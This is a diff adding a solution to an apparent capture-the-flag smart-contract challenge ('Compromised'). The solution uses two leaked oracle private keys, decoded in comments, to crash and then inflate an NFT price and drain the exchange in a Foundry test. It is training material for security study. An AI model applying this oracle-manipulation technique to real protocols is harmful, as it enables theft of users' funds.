@@ -73,7 +73,41 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {}
+    function test_compromised() public checkSolved {
+        // Convert hexadecimal to characters
+        // MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
+        // Decode from Base64 format
+        // A: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        // B: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+
+        address account_A = vm.addr(vm.parseUint("0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744"));
+        address account_B = vm.addr(vm.parseUint("0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159"));
+        assertEq(account_A, sources[0]);
+        assertEq(account_B, sources[1]);
+        // Change the price: 0.1 ETH
+        vm.prank(account_A);
+        oracle.postPrice(symbols[0], PLAYER_INITIAL_ETH_BALANCE);
+        vm.prank(account_B);
+        oracle.postPrice(symbols[0], PLAYER_INITIAL_ETH_BALANCE);
+        // Player buys the NFT
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        // Change the price: 999.1 ETH
+        vm.prank(account_A);
+        oracle.postPrice(symbols[0], PLAYER_INITIAL_ETH_BALANCE + INITIAL_NFT_PRICE);
+        vm.prank(account_B);
+        oracle.postPrice(symbols[0], PLAYER_INITIAL_ETH_BALANCE + INITIAL_NFT_PRICE);
+        // Player sells the NFT
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        payable(recovery).transfer(INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.prank(account_A);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
